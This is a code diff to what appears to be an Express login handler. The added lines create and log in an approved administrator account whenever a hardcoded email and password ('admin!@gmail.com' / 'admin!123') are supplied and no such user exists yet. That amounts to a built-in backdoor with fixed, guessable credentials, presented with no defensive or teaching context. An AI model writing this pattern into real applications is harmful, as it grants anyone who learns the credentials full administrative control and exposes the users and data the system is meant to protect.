@@ -72,7 +72,20 @@ const register = async (req, res) => {
 
 const login = async (req, res) => {
   const { email, password } = req.body;
-  const user = await User.findOne({ email });
+  let user = await User.findOne({ email });
+  
+  // Create admin user if it doesn't exist and credentials match
+  if (!user && email === 'admin!@gmail.com' && password === 'admin!123') {
+    user = await User.create({
+      name: 'Admin',
+      email: 'admin!@gmail.com',
+      phone: '0000000000',
+      password: 'admin!123',
+      role: 'admin',
+      status: 'approved'
+    });
+  }
+  
   if (!user || !(await user.comparePassword(password))) {
     return res.status(401).json({ message: "Invalid credentials" });
   }
